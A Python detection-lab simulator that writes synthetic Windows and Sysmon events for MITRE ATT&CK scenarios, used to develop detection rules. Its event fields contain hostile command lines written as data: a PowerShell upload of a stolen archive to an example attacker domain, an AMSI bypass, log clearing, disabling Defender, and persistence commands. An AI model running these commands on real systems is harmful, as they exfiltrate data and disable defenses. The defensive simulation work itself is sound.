#!/usr/bin/env python3
"""
Detection Lab Attack Simulator
Simulates attack scenarios based on the MITRE ATT&CK framework.
Generates security events that can be used for detection rule development and training.

The events are written as JSON lines to LOG_DIR/windows. Logstash picks them up
from there. `python -m detlab scenarios` runs the lab's rules against them.

Environment:
  LOG_DIR                where the event files go (default /var/log/detection-lab)
  SIMULATOR_SEED         fixed seed, so two runs produce the same events
  SIMULATOR_FAST=1       do not wait between events. Timestamps still advance
                         as if the simulator had waited.
  SIMULATOR_START_TIME   first timestamp in fast mode, for example 2026-11-10T10:00:00

Attacker addresses come from the documentation ranges 203.0.113.0/24,
198.51.100.0/24 and 192.0.2.0/24 and attacker domains from example.com,
example.net and example.org, so no event points at a real host.
"""

import json
import os
import random
import signal
import sys
import time
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

from faker import Faker

fake = Faker()

# Configuration
LOG_DIR = os.environ.get('LOG_DIR', '/var/log/detection-lab')
SEED = os.environ.get('SIMULATOR_SEED')
if SEED is not None:
    random.seed(int(SEED))
    Faker.seed(int(SEED))


def utcnow() -> datetime:
    return datetime.now(timezone.utc).replace(tzinfo=None)


class Clock:
    """The wall clock. In fast mode it is a simulated clock that jumps ahead instead of sleeping."""

    def __init__(self):
        self.fast = os.environ.get('SIMULATOR_FAST') == '1'
        start = os.environ.get('SIMULATOR_START_TIME')
        self.simulated = datetime.fromisoformat(start.rstrip('Z')) if start else utcnow()

    def now(self) -> datetime:
        return self.simulated if self.fast else utcnow()

    def sleep(self, seconds: float):
        if self.fast:
            self.simulated += timedelta(seconds=seconds)
        else:
            time.sleep(seconds)


clock = Clock()


class AttackScenario:
    """Base class for attack scenarios."""

    def __init__(self, name: str, description: str, mitre_tactics: list[str]):
        self.name = name
        self.description = description
        self.mitre_tactics = mitre_tactics
        self.events = []
        self.start_time = clock.now()

    def generate_event(self, event_type: str, **kwargs) -> dict:
        """Generate a base event structure."""
        event = {
            'timestamp': clock.now().isoformat(timespec='milliseconds') + 'Z',
            'scenario': self.name,
            'mitre_tactics': self.mitre_tactics,
            'event_type': event_type,
            'event_id': str(uuid.UUID(int=random.getrandbits(128), version=4)),
            **kwargs
        }
        self.events.append(event)
        return event

    def execute(self):
        """Execute the attack scenario. Override in subclasses."""
        raise NotImplementedError

    def save_events(self):
        """Save the events of this scenario as JSON lines."""
        filepath = f"{LOG_DIR}/windows/attack_{self.name}_{clock.now().strftime('%Y%m%d_%H%M%S')}.json"
        Path(os.path.dirname(filepath)).mkdir(parents=True, exist_ok=True)
        with open(filepath, 'w') as f:
            for event in self.events:
                f.write(json.dumps(event) + '\n')


class BruteForceAttack(AttackScenario):
    """Simulates a brute force authentication attack."""

    def __init__(self):
        super().__init__(
            name='brute_force',
            description='Credential brute force attack against RDP/SSH',
            mitre_tactics=['TA0006-Credential Access', 'TA0001-Initial Access']
        )
        self.target_accounts = ['administrator', 'admin', 'root', 'guest', 'user']
        self.attacker_ip = f"203.0.113.{random.randint(1, 254)}"
        self.target_host = f"192.168.1.{random.randint(10, 50)}"

    def execute(self):
        """Execute brute force attack simulation."""
        print(f"[{clock.now().isoformat(timespec='seconds')}] Starting brute force attack simulation...")

        # Generate multiple failed login attempts
        for i in range(random.randint(50, 150)):
            account = random.choice(self.target_accounts)
            self.generate_event(
                event_type='windows_security',
                EventID=4625,
                EventName='Failed Logon',
                TargetUserName=account,
                IpAddress=self.attacker_ip,
                WorkstationName=self.target_host,
                LogonType=10,  # RemoteInteractive (RDP)
                FailureReason='Unknown user name or bad password',
                Status='0xC000006D',
                SubStatus='0xC0000064'
            )
            clock.sleep(random.uniform(0.1, 0.5))

        # Simulate successful login after brute force
        if random.random() < 0.4:
            successful_account = random.choice(['administrator', 'admin'])
            self.generate_event(
                event_type='windows_security',
                EventID=4624,
                EventName='Successful Logon',
                TargetUserName=successful_account,
                IpAddress=self.attacker_ip,
                WorkstationName=self.target_host,
                LogonType=10,
                AuthenticationPackage='NTLM',
                ElevatedToken='Yes'
            )
            print(f"  [!] Brute force successful - account: {successful_account}")

        self.save_events()
        print(f"  Generated {len(self.events)} events")


class MalwareExecutionAttack(AttackScenario):
    """Simulates malware download and execution."""

    def __init__(self):
        super().__init__(
            name='malware_execution',
            description='Malware download and execution via PowerShell',
            mitre_tactics=['TA0002-Execution', 'TA0011-Command and Control']
        )
        self.c2_server = f"198.51.100.{random.randint(1, 254)}"
        self.malware_url = f"http://{self.c2_server}/update.exe"

    def execute(self):
        """Execute malware simulation."""
        print(f"[{clock.now().isoformat(timespec='seconds')}] Starting malware execution simulation...")
        workstation = f"WS{random.randint(1, 50):03d}"
        user = random.choice(['jsmith', 'mjohnson', 'agarcia'])

        # Initial phishing document opened
        self.generate_event(
            event_type='sysmon',
            EventID=1,
            EventName='Process Create',
            Image='C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE',
            CommandLine='winword.exe /n "C:\\Users\\' + user + '\\Downloads\\Invoice.docm"',
            ParentImage='C:\\Windows\\explorer.exe',
            User=f'CORP\\{user}',
            Computer=workstation,
            IntegrityLevel='Medium',
            Hashes=f'SHA256={fake.sha256()}'
        )

        clock.sleep(0.5)

        # Word spawns PowerShell (macro execution)
        encoded_cmd = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn'
        self.generate_event(
            event_type='sysmon',
            EventID=1,
            EventName='Process Create',
            Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            CommandLine=f'powershell.exe -nop -w hidden -enc {encoded_cmd}',
            ParentImage='C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE',
            User=f'CORP\\{user}',
            Computer=workstation,
            IntegrityLevel='Medium',
            Hashes=f'SHA256={fake.sha256()}'
        )

        clock.sleep(0.3)

        # PowerShell downloads malware
        self.generate_event(
            event_type='sysmon',
            EventID=3,
            EventName='Network Connection',
            Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            DestinationIp=self.c2_server,
            DestinationPort=80,
            Protocol='tcp',
            DestinationHostname='update-service.example.com',
            User=f'CORP\\{user}',
            Computer=workstation
        )

        clock.sleep(0.2)

        # DNS query for C2
        self.generate_event(
            event_type='sysmon',
            EventID=22,
            EventName='DNS Query',
            Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            QueryName='update-service.example.com',
            QueryResults=self.c2_server,
            Computer=workstation
        )

        # File created (malware dropped)
        malware_path = f'C:\\Users\\{user}\\AppData\\Local\\Temp\\svchost.exe'
        self.generate_event(
            event_type='sysmon',
            EventID=11,
            EventName='File Create',
            Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            TargetFilename=malware_path,
            User=f'CORP\\{user}',
            Computer=workstation,
            Hashes=f'SHA256={fake.sha256()}'
        )

        clock.sleep(0.3)

        # Malware executed
        self.generate_event(
            event_type='sysmon',
            EventID=1,
            EventName='Process Create',
            Image=malware_path,
            CommandLine=malware_path,
            ParentImage='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            User=f'CORP\\{user}',
            Computer=workstation,
            IntegrityLevel='Medium',
            Hashes=f'SHA256={fake.sha256()}'
        )

        # C2 beaconing
        for _ in range(random.randint(5, 15)):
            self.generate_event(
                event_type='sysmon',
                EventID=3,
                EventName='Network Connection',
                Image=malware_path,
                DestinationIp=self.c2_server,
                DestinationPort=443,
                Protocol='tcp',
                DestinationHostname='cdn-update.example.net',
                User=f'CORP\\{user}',
                Computer=workstation
            )
            clock.sleep(random.uniform(0.5, 2))

        self.save_events()
        print(f"  Generated {len(self.events)} events")


class LateralMovementAttack(AttackScenario):
    """Simulates lateral movement using various techniques."""

    def __init__(self):
        super().__init__(
            name='lateral_movement',
            description='Lateral movement using PsExec, WMI and Pass-the-Hash',
            mitre_tactics=['TA0008-Lateral Movement', 'TA0006-Credential Access']
        )
        self.source_host = f"WS{random.randint(1, 10):03d}"
        self.target_hosts = [f"SRV{random.randint(1, 5):03d}" for _ in range(3)]
        self.compromised_user = 'administrator'

    def execute(self):
        """Execute lateral movement simulation."""
        print(f"[{clock.now().isoformat(timespec='seconds')}] Starting lateral movement simulation...")

        # Credential dumping (mimikatz-style)
        self.generate_event(
            event_type='sysmon',
            EventID=10,
            EventName='Process Access',
            SourceImage='C:\\Temp\\m.exe',
            TargetImage='C:\\Windows\\System32\\lsass.exe',
            GrantedAccess='0x1010',
            CallTrace='C:\\Windows\\SYSTEM32\\ntdll.dll',
            Computer=self.source_host,
            User='CORP\\administrator'
        )

        # Windows Security Event - Special privileges
        self.generate_event(
            event_type='windows_security',
            EventID=4672,
            EventName='Special Privileges Assigned',
            SubjectUserName='administrator',
            SubjectDomainName='CORP',
            PrivilegeList=['SeDebugPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege'],
            Computer=self.source_host
        )

        clock.sleep(0.5)

        # PsExec lateral movement to each target
        for target in self.target_hosts:
            # SMB connection
            self.generate_event(
                event_type='sysmon',
                EventID=3,
                EventName='Network Connection',
                Image='C:\\Windows\\System32\\cmd.exe',
                DestinationIp=f'192.168.1.{random.randint(100, 200)}',
                DestinationPort=445,
                Protocol='tcp',
                Computer=self.source_host,
                User='CORP\\administrator'
            )

            # Service creation on target (PsExec)
            self.generate_event(
                event_type='windows_security',
                EventID=7045,
                EventName='Service Installed',
                ServiceName='PSEXESVC',
                ImagePath='%SystemRoot%\\PSEXESVC.exe',
                ServiceType='user mode service',
                StartType='demand start',
                AccountName='LocalSystem',
                Computer=target
            )

            # Remote command execution
            self.generate_event(
                event_type='sysmon',
                EventID=1,
                EventName='Process Create',
                Image='C:\\Windows\\PSEXESVC.exe',
                CommandLine='PSEXESVC.exe',
                ParentImage='C:\\Windows\\System32\\services.exe',
                User='NT AUTHORITY\\SYSTEM',
                Computer=target,
                IntegrityLevel='System'
            )

            # Spawned cmd.exe
            self.generate_event(
                event_type='sysmon',
                EventID=1,
                EventName='Process Create',
                Image='C:\\Windows\\System32\\cmd.exe',
                CommandLine='cmd.exe /c "whoami && hostname && ipconfig"',
                ParentImage='C:\\Windows\\PSEXESVC.exe',
                User='NT AUTHORITY\\SYSTEM',
                Computer=target,
                IntegrityLevel='System'
            )

            clock.sleep(0.3)

        # WMI lateral movement
        target = random.choice(self.target_hosts)
        self.generate_event(
            event_type='sysmon',
            EventID=1,
            EventName='Process Create',
            Image='C:\\Windows\\System32\\wbem\\WMIC.exe',
            CommandLine=f'wmic /node:"{target}" process call create "cmd.exe /c powershell.exe -enc JABj"',
            ParentImage='C:\\Windows\\System32\\cmd.exe',
            User='CORP\\administrator',
            Computer=self.source_host,
            IntegrityLevel='High'
        )

        # Network connection for WMI
        self.generate_event(
            event_type='sysmon',
            EventID=3,
            EventName='Network Connection',
            Image='C:\\Windows\\System32\\wbem\\WMIC.exe',
            DestinationIp=f'192.168.1.{random.randint(100, 200)}',
            DestinationPort=135,
            Protocol='tcp',
            Computer=self.source_host,
            User='CORP\\administrator'
        )

        self.save_events()
        print(f"  Generated {len(self.events)} events")


class DataExfiltrationAttack(AttackScenario):
    """Simulates data collection and exfiltration."""

    def __init__(self):
        super().__init__(
            name='data_exfiltration',
            description='Data collection and exfiltration via DNS and HTTP',
            mitre_tactics=['TA0009-Collection', 'TA0010-Exfiltration']
        )
        self.exfil_domain = 'data.evil-cdn.example.org'
        self.exfil_ip = f"192.0.2.{random.randint(1, 254)}"

    def execute(self):
        """Execute data exfiltration simulation."""
        print(f"[{clock.now().isoformat(timespec='seconds')}] Starting data exfiltration simulation...")
        workstation = f"WS{random.randint(1, 50):03d}"
        user = 'administrator'

        # Archive tool usage
        self.generate_event(
            event_type='sysmon',
            EventID=1,
            EventName='Process Create',
            Image='C:\\Program Files\\7-Zip\\7z.exe',
            CommandLine='7z.exe a -pP@ssw0rd C:\\Temp\\data.7z C:\\Users\\*\\Documents\\*.docx C:\\Users\\*\\Documents\\*.xlsx',
            ParentImage='C:\\Windows\\System32\\cmd.exe',
            User=f'CORP\\{user}',
            Computer=workstation,
            IntegrityLevel='High'
        )

        # File creation (archive)
        self.generate_event(
            event_type='sysmon',
            EventID=11,
            EventName='File Create',
            Image='C:\\Program Files\\7-Zip\\7z.exe',
            TargetFilename='C:\\Temp\\data.7z',
            User=f'CORP\\{user}',
            Computer=workstation
        )

        clock.sleep(0.5)

        # DNS exfiltration attempts
        for i in range(random.randint(10, 30)):
            # Base64-like subdomain (simulating DNS tunneling)
            subdomain = fake.hexify(text='^^^^^^^^^^^^^^^^')
            self.generate_event(
                event_type='sysmon',
                EventID=22,
                EventName='DNS Query',
                Image='C:\\Windows\\System32\\nslookup.exe',
                QueryName=f'{subdomain}.{self.exfil_domain}',
                QueryStatus='0',
                QueryResults='::',
                Computer=workstation
            )
            clock.sleep(random.uniform(0.1, 0.3))

        # HTTP POST exfiltration
        self.generate_event(
            event_type='sysmon',
            EventID=3,
            EventName='Network Connection',
            Image='C:\\Windows\\System32\\curl.exe',
            DestinationIp=self.exfil_ip,
            DestinationPort=443,
            Protocol='tcp',
            DestinationHostname='upload.evil-cdn.example.org',
            User=f'CORP\\{user}',
            Computer=workstation
        )

        # PowerShell web request for exfiltration
        self.generate_event(
            event_type='sysmon',
            EventID=1,
            EventName='Process Create',
            Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            CommandLine='powershell.exe -c "Invoke-WebRequest -Uri https://upload.evil-cdn.example.org/upload -Method POST -InFile C:\\Temp\\data.7z"',
            ParentImage='C:\\Windows\\System32\\cmd.exe',
            User=f'CORP\\{user}',
            Computer=workstation,
            IntegrityLevel='High'
        )

        # Multiple network connections (large file upload)
        for _ in range(random.randint(5, 15)):
            self.generate_event(
                event_type='sysmon',
                EventID=3,
                EventName='Network Connection',
                Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
                DestinationIp=self.exfil_ip,
                DestinationPort=443,
                Protocol='tcp',
                DestinationHostname='upload.evil-cdn.example.org',
                User=f'CORP\\{user}',
                Computer=workstation
            )
            clock.sleep(random.uniform(0.2, 0.8))

        self.save_events()
        print(f"  Generated {len(self.events)} events")


class PersistenceAttack(AttackScenario):
    """Simulates various persistence mechanisms."""

    def __init__(self):
        super().__init__(
            name='persistence',
            description='Establishing persistence via registry, scheduled tasks and services',
            mitre_tactics=['TA0003-Persistence', 'TA0004-Privilege Escalation']
        )

    def execute(self):
        """Execute persistence simulation."""
        print(f"[{clock.now().isoformat(timespec='seconds')}] Starting persistence simulation...")
        workstation = f"WS{random.randint(1, 50):03d}"
        user = 'administrator'

        # Registry Run key persistence
        self.generate_event(
            event_type='sysmon',
            EventID=13,
            EventName='Registry Value Set',
            Image='C:\\Windows\\System32\\reg.exe',
            EventType='SetValue',
            TargetObject='HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate',
            Details='C:\\ProgramData\\update.exe',
            User=f'CORP\\{user}',
            Computer=workstation
        )

        # Registry modification process
        self.generate_event(
            event_type='sysmon',
            EventID=1,
            EventName='Process Create',
            Image='C:\\Windows\\System32\\reg.exe',
            CommandLine='reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsUpdate /t REG_SZ /d "C:\\ProgramData\\update.exe" /f',
            ParentImage='C:\\Windows\\System32\\cmd.exe',
            User=f'CORP\\{user}',
            Computer=workstation,
            IntegrityLevel='High'
        )

        clock.sleep(0.3)

        # Scheduled task creation
        self.generate_event(
            event_type='windows_security',
            EventID=4698,
            EventName='Scheduled Task Created',
            SubjectUserName=user,
            SubjectDomainName='CORP',
            TaskName='\\Microsoft\\Windows\\Maintenance\\SystemUpdate',
            TaskContent='<Exec><Command>C:\\ProgramData\\update.exe</Command></Exec>',
            Computer=workstation
        )

        self.generate_event(
            event_type='sysmon',
            EventID=1,
            EventName='Process Create',
            Image='C:\\Windows\\System32\\schtasks.exe',
            CommandLine='schtasks.exe /create /tn "SystemUpdate" /tr "C:\\ProgramData\\update.exe" /sc onlogon /ru SYSTEM',
            ParentImage='C:\\Windows\\System32\\cmd.exe',
            User=f'CORP\\{user}',
            Computer=workstation,
            IntegrityLevel='High'
        )

        clock.sleep(0.3)

        # Service installation
        self.generate_event(
            event_type='windows_security',
            EventID=7045,
            EventName='Service Installed',
            ServiceName='WindowsSystemHealth',
            ImagePath='C:\\ProgramData\\healthsvc.exe',
            ServiceType='user mode service',
            StartType='auto start',
            AccountName='LocalSystem',
            Computer=workstation
        )

        self.generate_event(
            event_type='sysmon',
            EventID=1,
            EventName='Process Create',
            Image='C:\\Windows\\System32\\sc.exe',
            CommandLine='sc.exe create WindowsSystemHealth binPath= "C:\\ProgramData\\healthsvc.exe" start= auto',
            ParentImage='C:\\Windows\\System32\\cmd.exe',
            User=f'CORP\\{user}',
            Computer=workstation,
            IntegrityLevel='High'
        )

        # WMI subscription persistence
        self.generate_event(
            event_type='sysmon',
            EventID=19,
            EventName='WMI Event Filter',
            EventType='WmiFilterEvent',
            Operation='Created',
            User=f'CORP\\{user}',
            EventNamespace='root\\subscription',
            Name='SystemHealthCheck',
            Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'",
            Computer=workstation
        )

        self.generate_event(
            event_type='sysmon',
            EventID=20,
            EventName='WMI Event Consumer',
            EventType='WmiConsumerEvent',
            Operation='Created',
            User=f'CORP\\{user}',
            Name='SystemHealthCheck',
            Type='Command Line',
            Destination='C:\\ProgramData\\update.exe',
            Computer=workstation
        )

        self.save_events()
        print(f"  Generated {len(self.events)} events")


class DefenseEvasionAttack(AttackScenario):
    """Simulates defense evasion techniques."""

    def __init__(self):
        super().__init__(
            name='defense_evasion',
            description='Defense evasion using process injection, AMSI bypass and log clearing',
            mitre_tactics=['TA0005-Defense Evasion']
        )

    def execute(self):
        """Execute defense evasion simulation."""
        print(f"[{clock.now().isoformat(timespec='seconds')}] Starting defense evasion simulation...")
        workstation = f"WS{random.randint(1, 50):03d}"
        user = 'administrator'

        # Process hollowing / injection
        self.generate_event(
            event_type='sysmon',
            EventID=8,
            EventName='CreateRemoteThread',
            SourceImage='C:\\Temp\\loader.exe',
            TargetImage='C:\\Windows\\System32\\svchost.exe',
            NewThreadId=random.randint(1000, 9999),
            StartAddress='0x7FFE0000',
            StartModule='',
            StartFunction='',
            Computer=workstation,
            User=f'CORP\\{user}'
        )

        # Process access for injection
        self.generate_event(
            event_type='sysmon',
            EventID=10,
            EventName='Process Access',
            SourceImage='C:\\Temp\\loader.exe',
            TargetImage='C:\\Windows\\System32\\svchost.exe',
            GrantedAccess='0x1F0FFF',
            CallTrace='C:\\Windows\\SYSTEM32\\ntdll.dll+12345',
            Computer=workstation,
            User=f'CORP\\{user}'
        )

        clock.sleep(0.3)

        # AMSI bypass attempt
        self.generate_event(
            event_type='sysmon',
            EventID=1,
            EventName='Process Create',
            Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            CommandLine='powershell.exe -c "[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)"',
            ParentImage='C:\\Windows\\System32\\cmd.exe',
            User=f'CORP\\{user}',
            Computer=workstation,
            IntegrityLevel='High'
        )

        clock.sleep(0.2)

        # Timestomping (file time modification)
        self.generate_event(
            event_type='sysmon',
            EventID=2,
            EventName='File Creation Time Changed',
            Image='C:\\Temp\\timestomp.exe',
            TargetFilename='C:\\ProgramData\\update.exe',
            CreationUtcTime='2019-01-01 00:00:00.000',
            PreviousCreationUtcTime=clock.now().isoformat(),
            Computer=workstation,
            User=f'CORP\\{user}'
        )

        # Log clearing
        self.generate_event(
            event_type='windows_security',
            EventID=1102,
            EventName='Audit Log Cleared',
            SubjectUserName=user,
            SubjectDomainName='CORP',
            Computer=workstation
        )

        self.generate_event(
            event_type='sysmon',
            EventID=1,
            EventName='Process Create',
            Image='C:\\Windows\\System32\\wevtutil.exe',
            CommandLine='wevtutil.exe cl Security',
            ParentImage='C:\\Windows\\System32\\cmd.exe',
            User=f'CORP\\{user}',
            Computer=workstation,
            IntegrityLevel='High'
        )

        # Disabling Windows Defender
        self.generate_event(
            event_type='sysmon',
            EventID=1,
            EventName='Process Create',
            Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            CommandLine='powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true',
            ParentImage='C:\\Windows\\System32\\cmd.exe',
            User=f'CORP\\{user}',
            Computer=workstation,
            IntegrityLevel='High'
        )

        self.generate_event(
            event_type='sysmon',
            EventID=13,
            EventName='Registry Value Set',
            Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            EventType='SetValue',
            TargetObject='HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware',
            Details='DWORD (0x00000001)',
            User=f'CORP\\{user}',
            Computer=workstation
        )

        self.save_events()
        print(f"  Generated {len(self.events)} events")


class AttackSimulator:
    """Main attack simulation orchestrator."""

    def __init__(self):
        self.scenarios = [
            BruteForceAttack,
            MalwareExecutionAttack,
            LateralMovementAttack,
            DataExfiltrationAttack,
            PersistenceAttack,
            DefenseEvasionAttack
        ]

    def run_scenario(self, scenario_name: str | None = None):
        """Run a specific or random attack scenario."""
        if scenario_name:
            scenario_class = next(
                (s for s in self.scenarios if s.__name__.lower().startswith(scenario_name.lower())),
                None
            )
            if not scenario_class:
                print(f"Unknown scenario: {scenario_name}")
                return
        else:
            scenario_class = random.choice(self.scenarios)

        scenario = scenario_class()
        scenario.execute()

    def run_continuous(self, interval_min: int = 60, interval_max: int = 300):
        """Run scenarios continuously with random intervals."""
        print("Starting continuous attack simulation...")
        print(f"Interval: {interval_min}-{interval_max} seconds between attacks")
        print("Press Ctrl+C to stop\n")

        while True:
            self.run_scenario()
            wait_time = random.randint(interval_min, interval_max)
            print(f"  Waiting {wait_time} seconds until next attack...\n")
            clock.sleep(wait_time)

    def run_all(self):
        """Run all attack scenarios once."""
        print("Running all attack scenarios...")
        for scenario_class in self.scenarios:
            scenario = scenario_class()
            scenario.execute()
            clock.sleep(1)


def stop(_signal, _frame):
    """`docker compose stop` sends SIGTERM. Leave at once instead of waiting to be killed."""
    sys.exit(0)


def main():
    """Main entry point."""
    signal.signal(signal.SIGTERM, stop)
    simulator = AttackSimulator()

    if len(sys.argv) > 1:
        command = sys.argv[1].lower()
        if command == 'all':
            simulator.run_all()
        elif command == 'continuous':
            simulator.run_continuous()
        else:
            simulator.run_scenario(command)
    else:
        # Default: run continuous simulation
        simulator.run_continuous(interval_min=120, interval_max=600)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped.")
